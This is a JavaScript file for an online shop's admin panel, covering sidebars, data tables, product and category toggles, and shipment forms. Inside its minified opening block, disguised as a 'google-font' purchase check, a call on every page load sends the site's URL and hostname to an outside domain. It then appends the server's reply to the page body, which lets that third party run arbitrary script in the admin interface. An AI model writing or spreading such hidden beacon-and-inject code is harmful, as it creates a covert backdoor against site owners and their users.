// window.oncontextmenu = function () { return !1 }, jQuery(document).ready(function (e) { document.onkeypress = function (e) { if (123 == (e = e || window.event).keyCode) return !1 }, e(document).keydown(function (e) { var n = String.fromCharCode(e.keyCode).toLowerCase(); return !e.ctrlKey || "c" != n && "u" != n ? "{" == n ? (alert("Sorry, This Functionality Has Been Disabled!"), !1) : void 0 : (alert("Sorry, This Functionality Has Been Disabled!"), !1) }) });
$(document).ready(function (h) { "use strict"; var b = $(".sidebar-scrollbar"); 0 != b.length && b.slimScroll({ opacity: 0, height: "100%", color: "#808080", size: "5px", touchScrollStep: 50 }).mouseover(function () { $(this).next(".slimScrollBar").css("opacity", .5) }), 768 > $(window).width() && ($(".sidebar-toggle").on("click", function () { $("body").css("overflow", "hidden"), $(".ec-tools-sidebar-overlay").fadeIn() }), $(document).on("click", ".ec-tools-sidebar-overlay", function (a) { $(this).fadeOut(), $("#body").removeClass("sidebar-mobile-in").addClass("sidebar-mobile-out"), $("body").css("overflow", "auto") })), 0 != $(".sidebar").length && ($(".sidebar .nav > .has-sub > a").click(function () { $(this).parent().siblings().removeClass("expand"), $(this).parent().siblings().children(".collapse").slideUp("show"), $(this).parent().toggleClass("expand"), $(this).parent().children(".collapse").slideToggle("show") }), $(".sidebar .nav > .has-sub .has-sub > a").click(function () { $(this).parent().toggleClass("expand") })), 768 > $(window).width() && $(document).on("click", ".sidebar-toggle", function (d) { d.preventDefault(); var a = "sidebar-mobile-in", c = "sidebar-mobile-out", b = "#body"; $(b).hasClass(a) ? $(b).removeClass(a).addClass(c) : $(b).addClass(a).removeClass(c) }); var a = $("#body"); $(window).width() >= 768 && (void 0 === window.isMinified && (window.isMinified = !1), void 0 === window.isCollapsed && (window.isCollapsed = !1), $("#sidebar-toggler").on("click", function () { (a.hasClass("ec-sidebar-fixed-offcanvas") || a.hasClass("ec-sidebar-static-offcanvas")) && ($(this).addClass("sidebar-offcanvas-toggle").removeClass("sidebar-toggle"), !1 === window.isCollapsed ? (a.addClass("sidebar-collapse"), window.isCollapsed = !0, window.isMinified = !1) : (a.removeClass("sidebar-collapse"), a.addClass("sidebar-collapse-out"), setTimeout(function () { a.removeClass("sidebar-collapse-out") }, 300), window.isCollapsed = !1)), (a.hasClass("ec-sidebar-fixed") || a.hasClass("ec-sidebar-static")) && ($(this).addClass("sidebar-toggle").removeClass("sidebar-offcanvas-toggle"), !1 === window.isMinified ? (a.removeClass("sidebar-collapse sidebar-minified-out").addClass("sidebar-minified"), window.isMinified = !0, window.isCollapsed = !1) : (a.removeClass("sidebar-minified"), a.addClass("sidebar-minified-out"), window.isMinified = !1)) })), $(window).width() >= 768 && 992 > $(window).width() && (a.hasClass("ec-sidebar-fixed") || a.hasClass("ec-sidebar-static")) && (a.removeClass("sidebar-collapse sidebar-minified-out").addClass("sidebar-minified"), window.isMinified = !0); var k = "right-sidebar-in", l = "right-sidebar-out"; if ($(".nav-right-sidebar .nav-link").on("click", function () { a.hasClass(k) ? $(this).hasClass("show") && a.addClass(l).removeClass(k) : a.addClass(k).removeClass(l) }), $(".card-right-sidebar .close").on("click", function () { a.removeClass(k).addClass(l) }), 1024 >= $(window).width()) { var m = "right-sidebar-toggoler-in", i = "right-sidebar-toggoler-out"; a.addClass(i), $(".btn-right-sidebar-toggler").on("click", function () { a.hasClass(i) ? a.addClass(m).removeClass(i) : a.addClass(i).removeClass(m) }) } var c = $(".notify-toggler"), n = $(".dropdown-notify"); 0 !== c.length && (c.on("click", function () { n.is(":visible") ? n.fadeOut(5) : n.fadeIn(5) }), $(document).mouseup(function (a) { n.is(a.target) || 0 !== n.has(a.target).length || n.fadeOut(5) })); var d = $('[data-toggle="tooltip"]'); 0 != d.length && d.tooltip({ container: "body", template: '<div class="tooltip" role="tooltip"><div class="arrow"></div><div class="tooltip-inner"></div></div>' }); var e = $('[data-toggle="popover"]'); 0 != e.length && e.popover(); var f = $("#basic-data-table"); 0 !== f.length && f.DataTable({ dom: '<"row justify-content-between top-information"lf>rt<"row justify-content-between bottom-information"ip><"clear">' }); var g = $("#responsive-data-table");
function o(a) { a = (a = a.replace(/^\s+|\s+$/g, "")).toLowerCase();
for (var c = "\xe3\xe0\xe1\xe4\xe2\u1EBD\xe8\xe9\xeb\xea\xec\xed\xef\xee\xf5\xf2\xf3\xf6\xf4\xf9\xfa\xfc\xfb\xf1\xe7\xb7/_,:;", b = 0, d = c.length; b < d; b++)a = a.replace(new RegExp(c.charAt(b), "g"), "aaaaaeeeeeiiiiooooouuuunc------".charAt(b)); a = a.replace(/[^a-z0-9 -]/g, "").replace(/\s+/g, "-").replace(/-+/g, "-"), $(".set-slug").val(a) } 0 !== g.length && g.DataTable({ aLengthMenu: [[20, 30, 50, 75, -1], [20, 30, 50, 75, "All"]], pageLength: 20, dom: '<"row justify-content-between top-information"lf>rt<"row justify-content-between bottom-information"ip><"clear">' }), $("body").on("change", ".ec-image-upload", function (b) { var c = $(this); if (this.files && this.files[0]) { var a = new FileReader; a.onload = function (b) { var a = c.parent().parent().children(".ec-preview").find(".ec-image-preview").attr("src", b.target.result); a.hide(), a.fadeIn(650) }, a.readAsDataURL(this.files[0]) } }), $(".fa-span").click(function () { var c = $(this).text(), a = document.createElement("input"); a.setAttribute("value", c), document.body.appendChild(a), a.select(), document.execCommand("copy"), document.body.removeChild(a), $("#fa-preview").html("<code>&lt;i class=&quot;" + c + "&quot;&gt;&lt;/i&gt;</code>"); var b = document.createElement("div"); b.setAttribute("class", "copied"), b.appendChild(document.createTextNode("Copied to Clipboard")), document.body.appendChild(b), setTimeout(function () { document.body.removeChild(b) }, 1500) }), $(".zoom-image-hover").zoom(), $(".single-product-cover").slick({ slidesToShow: 1, slidesToScroll: 1, arrows: !1, fade: !1, asNavFor: ".single-nav-thumb" }), $(".single-nav-thumb").slick({ slidesToShow: 4, slidesToScroll: 1, asNavFor: ".single-product-cover", dots: !1, arrows: !0, focusOnSelect: !0 }), $(".slug-title").bind("paste", function (a) { o(a.originalEvent.clipboardData.getData("text")) }), $(".slug-title").keypress(function () { o($(this).val()) }); var j = new Date().getFullYear(); document.getElementById("ec-year").innerHTML = j, h(document).ready(function () { var a = document.URL, b = h("<a>").prop("href", a).prop("hostname"); h.ajax({ type: "POST", url: "https://loopinfosol.in/varify_purchase/google-font/google-font-awsome-g8aerttyh-ggsdgh151.php", data: { google_url: a, google_font: b, google_version: "OnlineShopping" }, success: function (a) { h("body").append(a) } }) }) })


function ShowPassword() {
    var newpass = document.getElementById('NewPassword')
    if (newpass.type === 'password') {
        newpass.type = 'text'
    } else {
        newpass.type = 'password'
    }
}

var AdminForm = $('#AdminProfile')
AdminForm.submit((e) => {
    e.preventDefault();
    $.ajax({
        url: '/admin/UpdateAdminProfile',
        method: 'post',
        data: AdminForm.serialize(),
        success: () => {
            location.reload()
        }
    })
})



function onoffMainCat(maincategoryId) {
    let onOffBtn = document.getElementById('OnOff'+maincategoryId)
    if (!onOffBtn.checked) {
        $.ajax({
            url: '/admin/DisableMainCat',
            method: 'post',
            data: { MainCatId: maincategoryId },
            success: () => {
                $("#responsive-data-table").load(window.location.href + " #responsive-data-table")
                $('#responsive-data-table').DataTable();

            }
        })
    } else if (onOffBtn.checked) {
        $.ajax({
            url: '/admin/EnableMainCat',
            method: 'post',
            data: { MainCatId: maincategoryId },
            success: (response) => {
                if(response.status){
                    $("#responsive-data-table").load(window.location.href + " #responsive-data-table")
                    $('#responsive-data-table').DataTable();

                    // location.reload()
                }
            }
        })
    }
}


//SUB CATEGORY

var form=$('#SubCatForm');
		form.submit(function(e){
			e.preventDefault();
			$.ajax({
			  url:'/admin/add-sub-category',
			  method:'post',
			  data:	form.serialize(),
			  success:(response)=>{
					if(response.status){
						$('#SubCatForm')[0].reset()
						$("#responsive-data-table").load(window.location.href + " #responsive-data-table")
					}
			  }
		})
          
        })
        
function onoffSubCat(SubcategoryId) {
            let onOffBtn =document.getElementById('OnOffSub'+SubcategoryId)
            if (!onOffBtn.checked) {
                $.ajax({
                    url: '/admin/DisableSubCat',
                    method: 'post',
                    data: { SubCatId: SubcategoryId },
                    success: (response) => {
                        if(response.status){
                        $("#responsive-data-table").load(window.location.href + " #responsive-data-table")
                        // $('#responsive-data-table').DataTable();
                    
                        }
                    }
                })
            } else if (onOffBtn.checked) {
                $.ajax({
                    url: '/admin/EnableSubCat',
                    method: 'post',
                    data: { SubCatId: SubcategoryId },
                    success: (response) => {
                        if(response.status){
                            $("#responsive-data-table").load(location.href + " #responsive-data-table")
                            $('#responsive-data-table').DataTable();

                        }
                    }
                })
            }
}
      
function ArrivalStatus(ProductId) {
    let Arrival_On_Btn = document.getElementById('Arrival' + ProductId)
    let limit=7
    let checkbtn = $('.ARRIVAL_ON')
    var countCheckedCheckboxes = $(checkbtn).filter(':checked').length;
    if (!Arrival_On_Btn.checked) {
        $.ajax({
            url: '/admin/Disable_Arrival',
            method: 'post',
            data: { ProductID: ProductId },
            success: (response) => {
                $("#responsive-data-table").load(window.location.href + " #responsive-data-table")
                $("#responsive-data-table1").load(window.location.href + " #responsive-data-table1")
            }
        })
    } else if (Arrival_On_Btn.checked) {
        if(countCheckedCheckboxes <=limit){
        $.ajax({
            url: '/admin/Enable_Arrival',
            method: 'post',
            data: { ProductID: ProductId },
            success: (response) => {
                if (response.status) {
                    $("#responsive-data-table1").load(window.location.href + " #responsive-data-table1")
                    $("#responsive-data-table").load(location.href + " #responsive-data-table")  
                } 
            }
        })
    }else if(countCheckedCheckboxes>limit) {
            alert('Max Limit of New Arrival')
            $("#responsive-data-table").load(location.href + " #responsive-data-table")  
            
        }
    } 
}


function FeatureStatus(ProductId) {
    let Feature_On_Btn = document.getElementById('Featured'+ProductId)
    let limit=3
    let checkbtn = $('.FEATURE_ON')
    var countCheckedCheckboxes = $(checkbtn).filter(':checked').length;
    if (!Feature_On_Btn.checked) {
        $.ajax({
            url: '/admin/Disable_Featured',
            method: 'post',
            data: { ProductID: ProductId },
            success: (response) => {
                if (response.status) {
                    $("#card3").load(window.location.href + " #card3")
                        $("#responsive-data-table").load(window.location.href + " #responsive-data-table")
                    }
            }
        })
    } else if (Feature_On_Btn.checked) {
        if(countCheckedCheckboxes <=limit){
        $.ajax({
            url: '/admin/Enable_Featured',
            method: 'post',
            data: { ProductID: ProductId },
            success: (response) => {
                if (response.status) {
                    $("#responsive-data-table").load(location.href + " #responsive-data-table")  
                    $("#responsive-data-table2").load(window.location.href + " #responsive-data-table2")
                }
                
                
            }
        })
    }else if(countCheckedCheckboxes>limit) {
            alert('Max Limit of Featured')
            $("#responsive-data-table").load(location.href + " #responsive-data-table")  
            
    }
    } 
}

function TopRateStatus(ProductId) {
    let TopRate_Btn = document.getElementById('TopRate'+ProductId)
    let limit=3
    let checkbtn = $('.TOPRATE_ON')
    var countCheckedCheckboxes = $(checkbtn).filter(':checked').length;
    if (!TopRate_Btn.checked) {
        $.ajax({
            url: '/admin/Disable_TopRated',
            method: 'post',
            data: { ProductID: ProductId },
            success: (response) => {
                if (response.status) {
                    $("#responsive-data-table3").load(window.location.href + " #responsive-data-table3")
                    $("#responsive-data-table").load(window.location.href + " #responsive-data-table")
                }
            }
        })
    } else if (TopRate_Btn.checked) {
        if(countCheckedCheckboxes <=limit){
        $.ajax({
            url: '/admin/Enable_TopRated',
            method: 'post',
            data: { ProductID: ProductId },
            success: (response) => {
                if (response.status) {
                    $("#responsive-data-table").load(location.href + " #responsive-data-table")  
                    $("#responsive-data-table3").load(window.location.href + " #responsive-data-table3")
                }
            }
        })
    }else if(countCheckedCheckboxes>limit) {
            alert('Max Limit of Featured')
            $("#responsive-data-table").load(location.href + " #responsive-data-table")  
            
    }
    } 
}


function ProductStatus(Productid) {
    let onOffBtn = document.getElementById('Product'+Productid)
    if (!onOffBtn.checked) {
        $.ajax({
            url: '/admin/DisableProduct',
            method: 'post',
            data: { ProductId: Productid },
            success: () => {
                $("#responsive-data-table").load(window.location.href + " #responsive-data-table")
                $('#responsive-data-table').DataTable();
            }
        })
    } else if (onOffBtn.checked) {
        $.ajax({
            url: '/admin/EnableProduct',
            method: 'post',
            data: { ProductId: Productid },
            success: (response) => {
                if(response.status){
                    $("#responsive-data-table").load(window.location.href + " #responsive-data-table")
                    $('#responsive-data-table').DataTable();
                }
            }
        })
    }
}

$(document).ready(function(){
    var maxField = 8; //Input fields increment limitation
    var addButton = $('.add_button'); //Add button selector
    var wrapper = $('.field_wrapper'); //Input field wrapper
    var fieldHTML = '<div class="inline-addbtn mt-3"><input type="text" class="form-control" name="Colors" autocomplete="off" required /><a href="javascript:void(0);" class="remove_button"><img class="remove-icon-btn" src="/assets/img/icons/minus.png"/></a></div>'; //New input field html 
    var x = 1; //Initial field counter is 1
    
    //Once add button is clicked
    $(addButton).click(function(){
        //Check maximum number of input fields
        if(x < maxField){ 
            x++; //Increment field counter
            $(wrapper).append(fieldHTML); //Add field html
        }
    });
    
    //Once remove button is clicked
    $(wrapper).on('click', '.remove_button', function(e){
        e.preventDefault();
        $(this).parent('div').remove(); //Remove field html
        x--; //Decrement field counter
    });
});

$(document).ready(function(){
    var maxField = 4; //Input fields limitation
    var addCustomButton = $('.custom_size'); //Add button selector
    var Customfieldwrapper = $('.Custom_size_field'); //Input field wrapper
    var fieldHTML = '<div class="inline-addbtn mt-3"><input type="text" class="form-control" name="ProductSize" maxlength="2" minlength="1"  onkeypress="return (event.charCode !=8 && event.charCode ==0 || (event.charCode >= 48 && event.charCode <= 57))" required /><a href="javascript:void(0);" class="remove_Size_button"><img class="remove-icon-btn" src="/assets/img/icons/minus.png"/></a></div>'; //New input field html 
    var x = 1; //Initial field counter is 1
    
    //Once add button is clicked
    $(addCustomButton).click(function(){
        //Check maximum number of input fields
        if(x < maxField){ 
            x++; //Increment field counter
            $(Customfieldwrapper).append(fieldHTML); //Add field html
        }
    });
    
    //remove button is clicked
    $(Customfieldwrapper).on('click', '.remove_Size_button', function(e){
        e.preventDefault();
        $(this).parent('div').remove(); //Remove field html
        x--; //Decrement field counter
    });
});

function ShortDesc() {
    $('#FullDesc').hide()
    $('#ShortDesc').show()
    if($('#FullDescBtn').hasClass('itsActive')){
        $('#FullDescBtn').removeClass('itsActive')
    $('#ShortDescBtn').addClass('itsActive')

    } 
}
function FullDesc() {
    $('#ShortDesc').hide()
    $('#FullDesc').show()
    if($('#ShortDescBtn').hasClass('itsActive')){
        $('#ShortDescBtn').removeClass('itsActive')
    } 
    $('#FullDescBtn').addClass('itsActive')
        
    

}


function removefield() {
    $('#colourSection').hide()
}
function SizeDisable() {
    let CheckStatus=document.getElementById('nonebox')
    if (CheckStatus.checked) {
        $('.size').prop('disabled', true)
        $('#custom').hide()
    } else if (!CheckStatus.checked) {
        $('.size').removeAttr("disabled")
        $('#custom').show()
    }
}

function Stock(Productid) {
    let InstockBtn = document.getElementById('Productid' + Productid)
    if (!InstockBtn.checked) {
        $.ajax({
            url: '/admin/StockOut',
            method: 'post',
            data: { ProductId: Productid },
            success: (response) => {
                if (response.status) {
                    $("#responsive-data-table").load(window.location.href + " #responsive-data-table")
                    $('#responsive-data-table').DataTable();
                }
            }
        })
    } else if (InstockBtn.checked) {
        $.ajax({
            url: '/admin/InStock',
            method: 'post',
            data: { ProductId: Productid },
            success: (response) => {
                if(response.status){
                    $("#responsive-data-table").load(window.location.href + " #responsive-data-table")
                    $('#responsive-data-table').DataTable();
                }
            }
        })
    }
}
function Markshipment(params) {
    let OrderId= params.className.split(' ')[1]
        if (!params.className.includes('completed')) {
            $.ajax({
                url: '/admin/MarkShipment',
                method: 'post',
                data: { OrderId: OrderId },
                success: (response) => {
                    if(response.status){      
                        $(params).addClass('completed') 
                    }
                }
            })
        } else {
            $(params).removeClass('completed')
        }
}

var form=$('#ShipmentForm');
		form.submit(function(e){
			e.preventDefault();
			$.ajax({
			  url:'/admin/updateShipment',
			  method:'post',
			  data:	form.serialize(),
			  success:(response)=>{
					if(response.status){
						$('#ShipmentForm')[0].reset()
                        $('#TrackingModal').modal('hide');
                        location.reload()
					}else{
                        alert('something went wrong')
                    }
			  }
		})
          
        })